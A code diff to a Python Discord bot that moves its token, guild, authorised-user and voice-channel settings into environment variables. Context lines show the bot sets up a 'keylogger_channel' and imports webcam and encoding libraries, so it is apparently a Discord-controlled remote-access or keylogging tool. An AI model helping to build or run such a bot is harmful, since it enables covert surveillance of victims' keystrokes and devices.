@@ -1,11 +1,3 @@
-# Replace this with your bot token
-TOKEN = "YOUR_BOT_TOKEN"
-
-GUILD_ID = YOUR_GUILD_ID
-
-# Replace this with your Discord user ID(s) that are allowed to control the bot
-AUTHORIZED_USERS = [YOUR_USER_ID]
-
 import asyncio
 import atexit
 import base64
@@ -32,6 +24,19 @@ from tkinter import messagebox
 
 import aiofiles
 import aiohttp
+from dotenv import load_dotenv
+
+# Load environment variables from .env file
+load_dotenv()
+
+TOKEN = os.getenv("BOT_TOKEN")
+GUILD_ID = int(os.getenv("GUILD_ID"))
+AUTHORIZED_USERS = [
+    int(uid.strip())
+    for uid in os.getenv("AUTHORIZED_USERS", "").split(",")
+    if uid.strip()
+]
+VOICE_CHANNEL_ID = int(os.getenv("VOICE_CHANNEL_ID"))
 import chardet
 import cv2
 import discord
@@ -227,7 +232,7 @@ async def on_ready():
         channel_ids["keylogger_channel"] = keylogger_channel.id
         print(f"Keylogger channel ID set to: {keylogger_channel.id}")
 
-        channel_ids["voice"] = YOUR_VOICE_CHANNEL_ID
+        channel_ids["voice"] = VOICE_CHANNEL_ID
 
         current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         # Send a message indicating that the bot is online
